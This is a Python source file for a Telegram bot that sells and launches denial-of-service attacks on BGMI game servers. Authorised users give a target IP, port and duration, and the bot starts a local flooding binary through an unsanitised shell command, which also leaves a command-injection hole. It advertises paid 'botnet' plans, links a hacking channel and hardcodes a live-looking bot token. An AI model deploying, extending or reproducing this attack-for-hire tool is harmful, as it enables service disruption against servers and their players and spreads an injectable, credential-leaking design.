#!/usr/bin/python3

import telebot
import subprocess
import datetime
import os
import signal
from threading import Timer

# insert your Telegram bot token here
bot = telebot.TeleBot("8227500008:AAFHWcXIxN1qoaRPXA1HePK9xLogb863ga4")

# Admin user IDs
admin_id = ["6132441793", "8221133918"]

# File to store allowed user IDs
USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# Cooldown 5 phút
bgmi_cooldown = {}
COOLDOWN_TIME = 120  # 5 phút

# Đọc users
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Log command
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    log_text = (
        f"Username: {username}\n"
        f"Target: {target}\n"
        f"Port: {port}\n"
        f"Time: {time}\n\n"
    )
    with open(LOG_FILE, "a") as file:
        file.write(log_text)

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target: log_entry += f" | Target: {target}"
    if port: log_entry += f" | Port: {port}"
    if time: log_entry += f" | Time: {time}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# ---------------- ADMIN COMMANDS ---------------- #
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.from_user.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.from_user.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for uid in allowed_user_ids:
                        file.write(f"{uid}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = "Please Specify A User ID to Remove. ✅ Usage: /remove <userid>"
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.from_user.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "w") as file:
                file.truncate(0)
            response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.from_user.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n" + "\n".join(user_ids)
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.from_user.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        else:
            bot.reply_to(message, "No data found ❌")
    else:
        bot.reply_to(message, "Only Admin Can Run This Command 😡.")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.from_user.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            msg_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for uid in user_ids:
                    try:
                        bot.send_message(uid, msg_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast to {uid}: {e}")
            response = "Broadcast Message Sent Successfully 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

# ---------------- USER COMMANDS ---------------- #
@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.from_user.id)
    bot.reply_to(message, f"🤖Your ID: {user_id}")

running_processes = {}

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.from_user.id)
    if user_id in allowed_user_ids or user_id in admin_id:
        # Check cooldown (admin không delay)
        if user_id not in admin_id:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                remaining = COOLDOWN_TIME - (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
                bot.reply_to(message, f"⏳ You are on cooldown! Please wait {remaining}s ❌")
                return

        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 181:
                bot.reply_to(message, "Error: Time interval must be less than 180.")
                return

            record_command_logs(user_id, '/bgmi', target, port, time)
            log_command(user_id, target, port, time)
            bot.reply_to(message, f"🔥 Attack started!\nTarget: {target}\nPort: {port}\nTime: {time}s")

            full_command = f"./bgmi {target} {port} {time} 200"
            process = subprocess.Popen(full_command, shell=True, preexec_fn=os.setsid)
            running_processes[user_id] = process
            bgmi_cooldown[user_id] = datetime.datetime.now()

            def finish_attack():
                bot.send_message(message.chat.id, f"✅ Attack finished!\nTarget: {target}\nPort: {port}\nTime: {time}s")
            Timer(time, finish_attack).start()
        else:
            bot.reply_to(message, "✅ Usage :- /bgmi <IP> <PORT> <Time>")
    else:
        bot.reply_to(message, "❌ You Are Not Authorized To Use This Command ❌.")

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    user_id = str(message.from_user.id)
    if user_id in allowed_user_ids or user_id in admin_id:
        if user_id in running_processes:
            process = running_processes[user_id]
            try:
                os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                del running_processes[user_id]
                response = "🛑 Attack stopped successfully!"
            except Exception as e:
                response = f"❌ Error stopping attack: {e}"
        else:
            response = "⚠️ No running attack found to stop."
    else:
        response = "❌ You Are Not Authorized To Use This Command ❌."
    bot.reply_to(message, response)

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.from_user.id)
    if user_id in allowed_user_ids or user_id in admin_id:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."
    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''🤖 Available commands:
💥 /bgmi : Method For Bgmi Servers. 
💥 /rules : Please Check Before Use !!.
💥 /mylogs : To Check Your Recent Attacks.
💥 /plan : Checkout Our Botnet Rates.

🤖 Admin Commands:
💥 /add <userId>
💥 /remove <userId>
💥 /allusers
💥 /logs
💥 /broadcast <msg>
💥 /clearlogs
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''👋🏻Welcome {user_name}!
🤖 Try /help 
✅Join :- t.me/cuonghackgames1'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:
1. Dont Run Too Many Attacks !!
2. Dont Run 2 Attacks At Same Time. 
3. Logs Are Checked Daily.'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Plans:
Vip 🌟 :
-> Attack Time : 180 (s)
-> After Attack Limit : 5 Min
-> Concurrents Attack : 3

Mua BOT💸 :
1Ngày-->15k
3Ngày-->40k
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def admin_cmd(message):
    response = '''Admin Commands:
💥 /add <userId>
💥 /remove <userId>
💥 /allusers
💥 /logs
💥 /broadcast <msg>
💥 /clearlogs
'''
    bot.reply_to(message, response)

# ---------------- START BOT ---------------- #
bot.polling()